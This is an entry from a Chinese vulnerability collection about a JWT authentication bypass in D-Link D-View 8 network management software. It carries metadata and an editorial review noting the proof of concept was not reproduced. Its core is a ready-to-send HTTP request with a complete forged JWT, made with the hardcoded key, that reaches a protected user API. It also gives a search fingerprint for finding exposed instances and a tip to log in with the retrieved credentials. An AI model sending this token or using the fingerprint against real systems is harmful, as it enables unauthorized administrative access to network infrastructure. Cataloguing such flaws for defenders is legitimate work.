---
source: "wy876 漏洞文库"
id: "vw-5078cd0d160cb377d2f6a50d"
entity_id: "ve-5078cd0d160cb377d2f6a50d"
schema_version: "1"
fofa_unverified: "web.title="
title: "D-Link D-View 8 JWT认证绕过漏洞"
product: "D-Link D-View8网络管理软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "≤2.0.1.28声称，默认组织/管理员标识未变"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/D-Link/D-LinkD-View8JWT%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/usw057398ry1de8p"
source_status: "recorded"
---

# D-Link D-View 8 JWT认证绕过漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：D-Link D-View8网络管理软件
- 本文讨论：硬编码JWT签名密钥/固定初始userId
- 版本、权限与配置前提：≤2.0.1.28声称，默认组织/管理员标识未变
- 资料类型：JWT伪造认证绕过请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 只给固定JWT没有密钥来源/生成逻辑，过期时间/组织标识约束未解释
- 声称取密码后登录但无响应/密文格式与认证材料重用说明
- IoT应归管理软件，FOFA元数据错标Hunter
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 签名密钥/固定ID条件、CVE与补丁待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
D-Link D-View 8是一款高度可定制且易于扩展的网络管理软件，可为任何规模的企业网络基础设施提供端到端的可管理性，支持多厂商设备监控和流量管理，提供实时网络概览和远程位置集中管理等功能。D-Link D-View 8在v2.0.1.28及之前版本中存在硬编码密钥漏洞，由于默认情况下，初始管理员的userId是相同的，未授权攻击者可以利用JWT密钥配合该userId伪造令牌，从而访问受保护的API路由。

# 二、影响版本
+ D-Link D-View 8

# 三、资产测绘
+ hunter`web.title="D-View 8"`
+ 特征


# 四、漏洞复现
```http
GET /dview8/api/usersByLevel HTTP/1.1
Host: xx.xx.xx.xx
Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
```


可通过获取的账号密码抓取登录数据包，替换用户名及加密密码后登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/usw057398ry1de8p>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
